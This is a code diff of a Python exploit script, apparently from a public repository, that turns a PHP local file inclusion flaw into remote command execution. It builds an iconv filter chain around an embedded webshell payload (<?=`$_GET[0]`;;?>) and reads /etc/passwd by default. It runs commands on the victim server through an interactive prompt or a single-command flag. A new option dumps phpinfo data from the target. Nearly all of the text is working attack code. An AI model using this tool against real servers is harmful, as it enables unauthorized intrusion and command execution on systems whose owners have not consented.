@@ -14,6 +14,7 @@ parser.add_argument("url", help = "full path to vulnerable page")
 parser.add_argument("parameter", help = "GET parameter vulnerable to LFI")
 
 parser.add_argument("-c", "--cookie", help = "cookie for the GET request")
+parser.add_argument("--phpinfo", help = "fetch phpinfo from the server and store it in phpinfo.html", action="store_true")
 parser.add_argument("-x", "--cmd", help = "execute a single command then stop program")
 parser.add_argument("-f", "--file", help = "remote file to use : this should point to a valid file on the victim's server. Default : /etc/passwd")
 parser.add_argument("-d", "--debug", help = "troubleshooting", action="store_true")
@@ -23,14 +24,15 @@ args = parser.parse_args()
 if args.debug:
     print("""
 If this script is not working as it should, it could be that :
-    1. Your Internet connection is not working.
-    2. The host is not accessible.
-    3. The parameters given are incorrect. You must enter the complete url to the vulnerable webpage, as well as the vulnerable GET parameter. Check README.md for more info.
-    4. The host is not vulnerable to LFI with filters.
-    5. The file used for exploit is not accessible on the server. By default, it's /etc/passwd but this won't work on a Windows server for example. Change it to another common file (index.php for example) with -f or --file.
-    6. The command prompted is incorrect. Remember : The server's OS could be Windows !
+    1. Check connection to host.
+    2. The parameters given are incorrect. You must enter the complete url to the vulnerable webpage, as well as the vulnerable GET parameter. Check README.md for more info.
+    3. The host is not vulnerable to LFI with filters.
+    4. The file used for exploit is not accessible on the server. By default, it's /etc/passwd but this won't work on a Windows server for example. Change it to another common file (index.php for example) with -f or --file.
+    5. The command prompted is incorrect. Remember : The server's OS could be Windows !
+    6. PHP system function is deactivated : check phpinfo() with --phpinfo
+    7. Some kind of WAF ?
 
-    7. I don't know... In that case, feel free to leave an issue on https://github.com/Tanguy-Boisset/LFI-to-RCE-filters/issues
+    8. I don't know... In that case, feel free to leave an issue on https://github.com/Tanguy-Boisset/LFI-to-RCE-filters/issues
     """)
     exit(0)
 
@@ -42,7 +44,10 @@ else:
     file_to_use = "/etc/passwd"
 
 # Injected payload
-base64_payload = "PD89YCRfR0VUWzBdYDs7Pz4" # <?=`$_GET[0]`;;?>
+if args.phpinfo:
+    base64_payload = "PD9waHAgcGhwaW5mbygpOyA/Pg==" # <?php phpinfo(); ?>
+else:
+    base64_payload = "PD89YCRfR0VUWzBdYDs7Pz4" # <?=`$_GET[0]`;;?>
 
 conversions = {
     '0': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2',
@@ -113,18 +118,18 @@ conversions = {
 }
 
 
-# generate some garbage base64
+# Generate some garbage base64
 filters = "convert.iconv.UTF8.CSISO2022KR|"
 filters += "convert.base64-encode|"
-# make sure to get rid of any equal signs in both the string we just generated and the rest of the file
+# Make sure to get rid of any equal signs in both the string we just generated and the rest of the file
 filters += "convert.iconv.UTF8.UTF7|"
 
 for c in base64_payload[::-1]:
         filters += conversions[c] + "|"
-        # decode and reencode to get rid of everything that isn't valid base64
+        # Decode and reencode to get rid of everything that isn't valid base64
         filters += "convert.base64-decode|"
         filters += "convert.base64-encode|"
-        # get rid of equal signs
+        # Get rid of equal signs
         filters += "convert.iconv.UTF8.UTF7|"
 
 filters += "convert.base64-decode"
@@ -132,21 +137,12 @@ filters += "convert.base64-decode"
 final_payload = f"php://filter/{filters}/resource={file_to_use}"
 
 
-if not args.cmd:
+if not args.cmd and not args.phpinfo:
     print("\nLaunching in pseudo-interactive mode...\nThis is NOT a shell, be careful what you execute (no cd, no interactive command...)\n")
 
-while True:
-    if args.cmd:
-        user_cmd = args.cmd
-    else:
-        try:
-            user_cmd = input("$ ")
-        except KeyboardInterrupt:
-            print("\nGood bye !")
-            exit(0)
-
+def send_cmd(user_cmd):
     # Should work for Windows and Linux servers
-    command = "echo AAAAA && %s && echo BBBBB" % user_cmd
+    command = "echo WXCVB && %s && echo POIUY" % user_cmd
 
     if args.cookie:
         cookie = SimpleCookie()
@@ -163,10 +159,77 @@ while True:
     response = r.text
 
     try:
-        find_rslt = response[response.index('AAAAA')+len('AAAAA'):response.index('BBBBB')]
-        print(find_rslt)
+        find_rslt = response[response.index('WXCVB')+len('WXCVB'):response.index('POIUY')]
+        return find_rslt, 0
     except ValueError:
         print("\nThis command was NOT successful !\nIf you keep running into this message, try relaunching this script with -d or --debug.\n")
+        return "", 1
 
-    if args.cmd:
-        exit(0)
+def get_phpinfo():
+    if args.cookie:
+        cookie = SimpleCookie()
+        cookie.load(args.cookie)
+        cookies = {k: v.value for k, v in cookie.items()}
+    else:
+        cookies = {}
+
+    r = requests.get(url, params={
+        args.parameter: final_payload
+    },cookies=cookies)
+
+    response = r.text
+
+    try:
+        find_rslt = response[response.index('<title>PHP'):response.index('<h2>PHP License</h2>')]
+        return find_rslt, 0
+    except ValueError:
+        print("\nUnable to retrieve phpinfo() data !\nIf you keep running into this message, try relaunching this script with -d or --debug.\n")
+        return "", 1
+
+
+if args.phpinfo:
+    rslt, exit_code = get_phpinfo()
+    if not exit_code:
+        with open("phpinfo.html", "w") as f:
+            phpinfo_css = """
+                        <style type="text/css">
+                            body {background-color: #fff; color: #222; font-family: sans-serif;}
+                            pre {margin: 0; font-family: monospace;}
+                            a:link {color: #009; text-decoration: none; background-color: #fff;}
+                            a:hover {text-decoration: underline;}
+                            table {border-collapse: collapse; border: 0; width: 934px; box-shadow: 1px 2px 3px #ccc;}
+                            .center {text-align: center;}
+                            .center table {margin: 1em auto; text-align: left;}
+                            .center th {text-align: center !important;}
+                            td, th {border: 1px solid #666; font-size: 75%; vertical-align: baseline; padding: 4px 5px;}
+                            th {position: sticky; top: 0; background: inherit;}
+                            h1 {font-size: 150%;}
+                            h2 {font-size: 125%;}
+                            .p {text-align: left;}
+                            .e {background-color: #ccf; width: 300px; font-weight: bold;}
+                            .h {background-color: #99c; font-weight: bold;}
+                            .v {background-color: #ddd; max-width: 300px; overflow-x: auto; word-wrap: break-word;}
+                            .v i {color: #999;}
+                            img {float: right; border: 0;}
+                            hr {width: 934px; background-color: #ccc; border: 0; height: 1px;}
+                        </style>
+            """
+            f.write(phpinfo_css)
+            f.write(rslt)
+        print("Done : phpinfo report available in phpinfo.html !\n")
+    exit(exit_code)
+
+elif args.cmd:
+    rslt, exit_code = send_cmd(args.cmd)
+    print(rslt)
+    exit(exit_code)
+
+else:
+    while True:
+        try:
+            user_cmd = input("$ ")
+            rslt, exit_code = send_cmd(user_cmd)
+            print(rslt)
+        except KeyboardInterrupt:
+            print("\nGood bye !")
+            exit(0)
